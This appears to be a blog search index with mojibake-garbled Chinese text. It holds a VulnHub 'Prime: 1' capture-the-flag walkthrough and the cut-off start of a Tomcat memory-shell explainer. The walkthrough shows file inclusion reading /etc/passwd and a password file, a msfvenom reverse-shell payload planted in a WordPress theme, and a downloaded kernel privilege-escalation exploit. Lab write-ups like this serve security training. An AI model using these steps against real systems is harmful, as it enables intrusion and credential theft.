<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Prime: 1</title>
      <link href="/2025/03/31/Prime-1/"/>
      <url>/2025/03/31/Prime-1/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="ç¡®å®šä¸»æœºä½ç½®"><a href="#ç¡®å®šä¸»æœºä½ç½®" class="headerlink" title="ç¡®å®šä¸»æœºä½ç½®"></a>ç¡®å®šä¸»æœºä½ç½®</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> nmap -sn 192.168.205.0/24</span>                                          </span><br><span class="line">[sudo] kali çš„å¯†ç ï¼š</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-31 07:49 EDT</span><br><span class="line">Nmap scan report for 192.168.205.1 (192.168.205.1)</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:01 (VMware)</span><br><span class="line">Nmap scan report for 192.168.205.2 (192.168.205.2)</span><br><span class="line">Host is up (0.00014s latency).</span><br><span class="line">MAC Address: 00:50:56:F7:4F:9C (VMware)</span><br><span class="line">Nmap scan report for 192.168.205.137 (192.168.205.137)</span><br><span class="line">Host is up (0.00039s latency).</span><br><span class="line">MAC Address: 00:0C:29:32:80:FE (VMware)</span><br><span class="line">Nmap scan report for 192.168.205.254 (192.168.205.254)</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line">MAC Address: 00:50:56:FD:69:37 (VMware)</span><br><span class="line">Nmap scan report for 192.168.205.128 (192.168.205.128)</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 1.97 seconds</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> arp-scan -l</span>              </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:e7:49:b2, IPv4: 192.168.205.128</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.205.1   00:50:56:c0:00:01       VMware, Inc.</span><br><span class="line">192.168.205.2   00:50:56:f7:4f:9c       VMware, Inc.</span><br><span class="line">192.168.205.137 00:0c:29:32:80:fe       VMware, Inc.</span><br><span class="line">192.168.205.254 00:50:56:fd:69:37       VMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 1.998 seconds (128.13 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure><p>ç¡®å®š137æ˜¯æˆ‘ä»¬çš„ç›®æ ‡ä¸»æœº</p><p>é¦–å…ˆè¿›è¡Œtcpæ‰«æç„¶åä¿å­˜</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sT --min-rate 10000 -p- 192.168.205.137 -oA nmapscan/tcp</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-31 07:53 EDT</span><br><span class="line">Nmap scan report for 192.168.205.137 (192.168.205.137)</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:32:80:FE (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds</span><br></pre></td></tr></table></figure><p>å‘ç°ä¸¤ä¸ªç«¯å£æ‰“å¼€ è¿™é‡Œä¸ºäº†ä¿æŒå¥½ä¹ æƒ¯ å‡è®¾ç¢°ä¸Šå¤šä¸ªç«¯å£çš„è¯ï¼ˆåªæ˜¯è¿›è¡Œç»ƒä¹ ï¼‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep open nmapscan/tcp.nmap|awk -F&#x27;/&#x27; &#x27;&#123;print($1)&#125;&#x27;|paste -sd &quot;,&quot;</span><br><span class="line"></span><br><span class="line">22,80</span><br></pre></td></tr></table></figure><p>å¯¹è¿™ä¸ªè¿ä¸ªç«¯å£è¿›è¡Œå…¨é¢æ‰«æ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sT -sV -sC -O -p22,80 192.168.205.137 -oA nmapscan/web                        </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-31 07:57 EDT</span><br><span class="line">Nmap scan report for 192.168.205.137 (192.168.205.137)</span><br><span class="line">Host is up (0.00092s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 (RSA)</span><br><span class="line">|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)</span><br><span class="line">|_  256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: HacknPentest</span><br><span class="line">MAC Address: 00:0C:29:32:80:FE (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.96 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>äºæ­¤åŒæ—¶å‘ç°å¯¹udpç«¯å£è¿›è¡Œæ‰«æ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> nmap -sU --top-ports 20 192.168.205.137 -oA nmapscan/udp</span></span><br><span class="line">[sudo] kali çš„å¯†ç ï¼š</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-31 07:59 EDT</span><br><span class="line">Nmap scan report for 192.168.205.137 (192.168.205.137)</span><br><span class="line">Host is up (0.00086s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line">53/udp    closed        domain</span><br><span class="line">67/udp    closed        dhcps</span><br><span class="line">68/udp    open|filtered dhcpc</span><br><span class="line">69/udp    closed        tftp</span><br><span class="line">123/udp   closed        ntp</span><br><span class="line">135/udp   closed        msrpc</span><br><span class="line">137/udp   closed        netbios-ns</span><br><span class="line">138/udp   closed        netbios-dgm</span><br><span class="line">139/udp   closed        netbios-ssn</span><br><span class="line">161/udp   closed        snmp</span><br><span class="line">162/udp   closed        snmptrap</span><br><span class="line">445/udp   closed        microsoft-ds</span><br><span class="line">500/udp   closed        isakmp</span><br><span class="line">514/udp   closed        syslog</span><br><span class="line">520/udp   closed        route</span><br><span class="line">631/udp   open|filtered ipp</span><br><span class="line">1434/udp  closed        ms-sql-m</span><br><span class="line">1900/udp  closed        upnp</span><br><span class="line">4500/udp  closed        nat-t-ike</span><br><span class="line">49152/udp closed        unknown</span><br><span class="line">MAC Address: 00:0C:29:32:80:FE (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 23.42 seconds</span><br></pre></td></tr></table></figure><p>631&#x2F;udp   open|filtered ipp</p><p>68&#x2F;udp    open|filtered dhcpc</p><p>å‘ç°å¯èƒ½æ‰“å¼€çš„ä¸¤ä¸ªç«¯å£</p><p>ç”¨è„šæœ¬æ‰«æç«¯å£æ¼æ´äºæ­¤åŒæ—¶å¯¹æ‰“å¼€çš„80ç«¯å£è¿›è¡Œç›®å½•æ‰«æ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> nmap --script=vuln -p80,22 192.168.205.137 -oA nmapscan/vuln</span>   </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-31 08:04 EDT</span><br><span class="line">Nmap scan report for 192.168.205.137 (192.168.205.137)</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /wordpress/: Blog</span><br><span class="line">|_  /wordpress/wp-login.php: Wordpress login page.</span><br><span class="line">MAC Address: 00:0C:29:32:80:FE (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 174.19 seconds</span><br></pre></td></tr></table></figure><p>ç›®å½•æ‰«æç»“æœ</p><p>[08:06:03] 200 -  131B  - &#x2F;dev<br>[08:06:06] 200 -  137B  - &#x2F;image.php</p><p>[08:06:18] 200 -    1KB - &#x2F;wordpress&#x2F;wp-login.php<br>[08:06:18] 200 -    4KB - &#x2F;wordpress&#x2F;</p><p>é¦–å…ˆè®¿é—®ä¸‹&#x2F;dev</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> curl 192.168.205.137/dev</span></span><br><span class="line">hello,</span><br><span class="line"></span><br><span class="line">now you are at level 0 stage.</span><br><span class="line"></span><br><span class="line">In real life pentesting we should use our tools to dig on a web very hard.</span><br><span class="line"></span><br><span class="line">Happy hacking. </span><br></pre></td></tr></table></figure><p>ä¸€äº›æç¤ºå‘Šè¯‰æˆ‘ä»¬è¦ä½¿ç”¨å·¥å…·æ¥å¯¹webè¿›è¡Œæ¸—é€</p><p>é‚£ä¹ˆæˆ‘ä»¬è¿›ä¸€æ­¥å¯¹webè¿›è¡Œwebçœ‹æœ‰æ²¡æ–‡ä»¶é—ç•™</p><p>è¿™é‡Œä½¿ç”¨dirb</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo dirb http://192.168.205.137 -X .zip,.txt -o nmapscan</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">DIRB v2.22    </span><br><span class="line"></span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">OUTPUT_FILE: nmapscan/file</span><br><span class="line">START_TIME: Mon Mar 31 08:36:15 2025</span><br><span class="line">URL_BASE: http://192.168.205.137/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">EXTENSIONS_LIST: (.zip,.txt) | (.zip)(.txt) [NUM = 2]</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                        </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.205.137/ ----</span><br><span class="line"></span><br><span class="line">+ http://192.168.205.137/secret.txt (CODE:200|SIZE:412)      </span><br><span class="line">                                                             </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">END_TIME: Mon Mar 31 08:36:21 2025</span><br><span class="line">DOWNLOADED: 9224 - FOUND: 1</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰æ–°çš„ç»“æœ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo curl 192.168.205.137/secret.txt</span><br><span class="line">Looks like you have got some secrets.</span><br><span class="line"></span><br><span class="line">Ok I just want to do some help to you. </span><br><span class="line"></span><br><span class="line">Do some more fuzz on every page of php which was finded by you. And if</span><br><span class="line">you get any right parameter then follow the below steps. If you still stuck </span><br><span class="line">Learn from here a basic tool with good usage for OSCP.</span><br><span class="line"></span><br><span class="line">https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//see the location.txt and you will get your next move//</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºå¯¹å·²ç»æ‰¾åˆ°çš„phpè¿›è¡Œfuzz,</p><p>é‚£ç»§ç»­dirbæ‰¾php</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo dirb http://192.168.205.137 -X .php -o nmapscan/file</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">DIRB v2.22    </span><br><span class="line"></span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">OUTPUT_FILE: nmapscan/file</span><br><span class="line">START_TIME: Mon Mar 31 08:48:03 2025</span><br><span class="line">URL_BASE: http://192.168.205.137/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">                                                             GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.205.137/ ----</span><br><span class="line">                                                             + http://192.168.205.137/image.php (CODE:200|SIZE:147)      </span><br><span class="line"></span><br><span class="line">+ http://192.168.205.137/index.php (CODE:200|SIZE:136)      </span><br><span class="line">                                                                               </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">END_TIME: Mon Mar 31 08:48:06 2025</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 2</span><br></pre></td></tr></table></figure><p>å¯¹index.phpè¿›è¡Œfuzz</p><p>å‘ç°file</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hh 136 http://192.168.205.137/index.php?FUZZ=something</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.205.137/index.php?FUZZ=something</span><br><span class="line">Total requests: 951</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                                                     </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000341:   200        7 L      19 W       206 Ch      &quot;file&quot;                                                      </span><br><span class="line"></span><br><span class="line">Total time: 0</span><br><span class="line">Processed Requests: 951</span><br><span class="line">Filtered Requests: 950</span><br><span class="line">Requests/sec.: 0</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo curl http://192.168.205.137/index.php?file                                                                                 </span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;HacknPentest&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;img src=&#x27;hacknpentest.png&#x27; alt=&#x27;hnp security&#x27; width=&quot;1300&quot; height=&quot;595&quot; /&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">Do something better &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;you are digging wrong file&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>æç¤ºæˆ‘ä»¬æŒ–çš„æ–‡ä»¶é”™è¯¯</p><p>æ ¹æ®ä¸Šé¢çš„æç¤ºæˆ‘ä»¬éœ€è¦è®¿é—®location.txt</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> curl http://192.168.205.137/index.php?file=location.txt</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;HacknPentest&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;img src=&#x27;hacknpentest.png&#x27; alt=&#x27;hnp security&#x27; width=&quot;1300&quot; height=&quot;595&quot; /&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">Do something better &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;ok well Now you reah at the exact parameter &lt;br&gt;&lt;br&gt;Now dig some more for next one &lt;br&gt;use &#x27;secrettier360&#x27; parameter on some other php page for more fun.</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>å‘Šè¯‰æˆ‘ä»¬åœ¨å…¶ä»–phpæ–‡ä»¶ä¸­ç”¨å‚æ•°secrettier360è¿›è¡Œæµ‹è¯•</p><p>è®¿é—®ä¹‹å‰çš„image.phpè¯•è¯•æŠŠ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> sudo curl http://192.168.205.137/image.php?secrettier360=</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;HacknPentest&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;img src=&#x27;hacknpentest.png&#x27; alt=&#x27;hnp security&#x27; width=&quot;1300&quot; height=&quot;595&quot; /&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">finaly you got the right parameter&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;/html&gt;</span><br><span class="line">                                                           </span><br></pre></td></tr></table></figure><p><a href="http://192.168.205.137/image.php?secrettier360=/etc/passwd">http://192.168.205.137/image.php?secrettier360=/etc/passwd</a></p><p>å¯ä»¥å‘ç°è¿™ä¸ªå‚æ•°å­˜åœ¨æ–‡ä»¶åŒ…å«</p><p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªrootç”¨æˆ·å’Œä¸€ä¸ªvictorç”¨æˆ·åº”è¯¥æ˜¯å¯ä»¥åˆ©ç”¨çš„</p><p>åŒæ—¶å‘ç°</p><p>saket:x:1001:1001:find password.txt file in my directory:&#x2F;home&#x2F;saket:</p><p><a href="http://192.168.205.137/image.php?secrettier360=/home/saket/password.txt">http://192.168.205.137/image.php?secrettier360=/home/saket/password.txt</a></p><p>follow_the_ippsec</p><p>åº”è¯¥æ˜¯å¯†ç æˆ‘ä»¬ç”¨sshå°è¯•ç™»å½•victor</p><p>å¥½å§ä¸æ˜¯</p><p>è¯•ä¸€è¯•wordpressçš„ç™»å½•é¡µé¢</p><p>æˆåŠŸï¼</p><p>victor:follow_the_ippsec</p><p>ç™»å½•åˆ°åå°</p><p>å‘ç°ç‰ˆæœ¬å·WordPress 6.7.2 </p><p>æŸ¥çœ‹æ¼æ´åˆ©ç”¨</p><p>åœ¨ä¸»é¢˜è¿™é‡Œçš„secret.phpæ˜¯å¯ä»¥è¿›è¡Œä¸Šä¼ shellçš„</p><p>æˆ‘ä»¬ç”¨</p><p>msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.205.128 LPORT&#x3D;7777  -o mshell.php</p><p>ç”Ÿæˆshell ç„¶åæŠŠé‡Œé¢å†…å®¹ä¼ åˆ°secret.phpé‡Œé¢</p><p>msfconsoleè¿›è¡Œåå¼¹shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for www-data on ubuntu:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on ubuntu:</span><br><span class="line">    (root) NOPASSWD: /home/saket/enc</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd</span><br><span class="line">cd /home</span><br><span class="line">ls</span><br><span class="line">saket</span><br><span class="line">victor</span><br><span class="line">cd saket </span><br><span class="line">ls</span><br><span class="line">enc</span><br><span class="line">password.txt</span><br><span class="line">user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">af3c658dcf9d7190da3153519c003456</span><br></pre></td></tr></table></figure><p>ç°è·å¾—ä¸€ä¸ªflag</p><p>uname -a<br>Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 G</p><p>æŸ¥çœ‹å†…æ ¸å‘ç°å†…æ ¸ç‰ˆæœ¬æ¯”è¾ƒä½ çœ‹èƒ½å¦è¿›è¡Œå†…æ ¸ææƒ</p><p>ä¸‹è½½45010 ç„¶åæœ¬åœ°èµ·ä¸€ä¸ªhttpæœåŠ¡</p><p>é¶æœºè¿™è¾¹å¯ä»¥åˆ©ç”¨wget è¿›è¡Œä¸‹è½½ éœ€è¦åˆ°é¶æœºé‡Œé¢è¿›è¡Œç¼–è¯‘ç„¶åå³å¯æˆåŠŸææƒ </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat root.txt</span><br><span class="line">b2b17036da1de94cfb024540a8e7075a</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcatå†…å­˜é©¬</title>
      <link href="/2025/03/30/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2025/03/30/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat-Servlet"><a href="#Tomcat-Servlet" class="headerlink" title="Tomcat-Servlet"></a>Tomcat-Servlet</h1><p>é¦–å…ˆå›é¡¾ä¸‹Tomcatä¸Servletçš„å…³ç³»</p><p>fromï¼š<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/</a></p><p>Tomcatç”±å››å¤§å®¹å™¨ç»„æˆï¼Œåˆ†åˆ«æ˜¯Engineã€Hostã€Contextã€Wrapperã€‚è¿™å››ä¸ªç»„ä»¶æ˜¯è´Ÿè´£å…³ç³»ï¼Œå­˜åœ¨åŒ…å«å…³ç³»ã€‚åªåŒ…å«ä¸€ä¸ªå¼•æ“ï¼ˆEngineï¼‰ï¼š</p><blockquote><p>Engineï¼ˆå¼•æ“ï¼‰ï¼šè¡¨ç¤ºå¯è¿è¡Œçš„Catalinaçš„servletå¼•æ“å®ä¾‹ï¼Œå¹¶ä¸”åŒ…å«äº†servletå®¹å™¨çš„æ ¸å¿ƒåŠŸèƒ½ã€‚åœ¨ä¸€ä¸ªæœåŠ¡ä¸­åªèƒ½æœ‰ä¸€ä¸ªå¼•æ“ã€‚åŒæ—¶ï¼Œä½œä¸ºä¸€ä¸ªçœŸæ­£çš„å®¹å™¨ï¼ŒEngineå…ƒç´ ä¹‹ä¸‹å¯ä»¥åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªè™šæ‹Ÿä¸»æœºã€‚å®ƒä¸»è¦åŠŸèƒ½æ˜¯å°†ä¼ å…¥è¯·æ±‚å§”æ‰˜ç»™é€‚å½“çš„è™šæ‹Ÿä¸»æœºå¤„ç†ã€‚å¦‚æœæ ¹æ®åç§°æ²¡æœ‰æ‰¾åˆ°å¯å¤„ç†çš„è™šæ‹Ÿä¸»æœºï¼Œé‚£ä¹ˆå°†æ ¹æ®é»˜è®¤çš„Hostæ¥åˆ¤æ–­è¯¥ç”±å“ªä¸ªè™šæ‹Ÿä¸»æœºå¤„ç†ã€‚</p><p>Host ï¼ˆè™šæ‹Ÿä¸»æœºï¼‰ï¼šä½œç”¨å°±æ˜¯è¿è¡Œå¤šä¸ªåº”ç”¨ï¼Œå®ƒè´Ÿè´£å®‰è£…å’Œå±•å¼€è¿™äº›åº”ç”¨ï¼Œå¹¶ä¸”æ ‡è¯†è¿™ä¸ªåº”ç”¨ä»¥ä¾¿èƒ½å¤ŸåŒºåˆ†å®ƒä»¬ã€‚å®ƒçš„å­å®¹å™¨é€šå¸¸æ˜¯ Contextã€‚ä¸€ä¸ªè™šæ‹Ÿä¸»æœºä¸‹éƒ½å¯ä»¥éƒ¨ç½²ä¸€ä¸ªæˆ–è€…å¤šä¸ªWeb Appï¼Œæ¯ä¸ªWeb Appå¯¹åº”äºä¸€ä¸ªContextï¼Œå½“Hostè·å¾—ä¸€ä¸ªè¯·æ±‚æ—¶ï¼Œå°†æŠŠè¯¥è¯·æ±‚åŒ¹é…åˆ°æŸä¸ªContextä¸Šï¼Œç„¶åæŠŠè¯¥è¯·æ±‚äº¤ç»™è¯¥Contextæ¥å¤„ç†ã€‚ä¸»æœºç»„ä»¶ç±»ä¼¼äºApacheä¸­çš„è™šæ‹Ÿä¸»æœºï¼Œä½†åœ¨Tomcatä¸­åªæ”¯æŒåŸºäºFQDN(å®Œå…¨åˆæ ¼çš„ä¸»æœºå)çš„â€œè™šæ‹Ÿä¸»æœºâ€ã€‚Hostä¸»è¦ç”¨æ¥è§£æweb.xml</p><p>Contextï¼ˆä¸Šä¸‹æ–‡ï¼‰ï¼šä»£è¡¨ Servlet çš„ Contextï¼Œå®ƒå…·å¤‡äº† Servlet è¿è¡Œçš„åŸºæœ¬ç¯å¢ƒï¼Œå®ƒè¡¨ç¤ºWebåº”ç”¨ç¨‹åºæœ¬èº«ã€‚Context æœ€é‡è¦çš„åŠŸèƒ½å°±æ˜¯ç®¡ç†å®ƒé‡Œé¢çš„ Servlet å®ä¾‹ï¼Œä¸€ä¸ªContextä»£è¡¨ä¸€ä¸ªWebåº”ç”¨ï¼Œä¸€ä¸ªWebåº”ç”¨ç”±ä¸€ä¸ªæˆ–è€…å¤šä¸ªServletå®ä¾‹ç»„æˆã€‚</p><p>Wrapperï¼ˆåŒ…è£…å™¨ï¼‰ï¼šä»£è¡¨ä¸€ä¸ª Servletï¼Œå®ƒè´Ÿè´£ç®¡ç†ä¸€ä¸ª Servletï¼ŒåŒ…æ‹¬çš„ Servlet çš„è£…è½½ã€åˆå§‹åŒ–ã€æ‰§è¡Œä»¥åŠèµ„æºå›æ”¶ã€‚Wrapper æ˜¯æœ€åº•å±‚çš„å®¹å™¨ï¼Œå®ƒæ²¡æœ‰å­å®¹å™¨äº†ï¼Œæ‰€ä»¥è°ƒç”¨å®ƒçš„ addChild å°†ä¼šæŠ¥é”™ã€‚</p></blockquote><p>æˆ‘è¿˜æ˜¯ç”¨å¤§ç™½è¯æ›´å¥½ç†è§£è¿™ä¸ªæ¯”è¾ƒæŠ½è±¡çš„æ¦‚å¿µ</p><p>ç”¨ <strong>ã€Œå¿«é€’å…¬å¸ã€</strong> çš„æ¯”å–»ç§’æ‡‚è¿™å››ä¸ªç»„ä»¶çš„å…³ç³»ğŸ‘‡</p><hr><h3 id="ä¸€ã€Engineï¼ˆå¼•æ“ï¼‰â€”â€”å¿«é€’æ€»å…¬å¸"><a href="#ä¸€ã€Engineï¼ˆå¼•æ“ï¼‰â€”â€”å¿«é€’æ€»å…¬å¸" class="headerlink" title="ä¸€ã€Engineï¼ˆå¼•æ“ï¼‰â€”â€”å¿«é€’æ€»å…¬å¸"></a><strong>ä¸€ã€Engineï¼ˆå¼•æ“ï¼‰â€”â€”å¿«é€’æ€»å…¬å¸</strong></h3><p><strong>æ¯”å–»</strong>ï¼šEngine å°±åƒå¿«é€’å…¬å¸çš„ <strong>å…¨å›½è°ƒåº¦ä¸­å¿ƒ</strong>ï¼ŒæŒæ¡ç€æ‰€æœ‰åˆ†å…¬å¸çš„ä¿¡æ¯ã€‚<br><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š</p><ol><li><strong>ç»Ÿç­¹å…¨å±€</strong>ï¼šå½“åŒ…è£¹ï¼ˆHTTPè¯·æ±‚ï¼‰åˆ°è¾¾æ€»å…¬å¸ï¼ŒEngine æ ¹æ®å¿«é€’å•ä¸Šçš„ 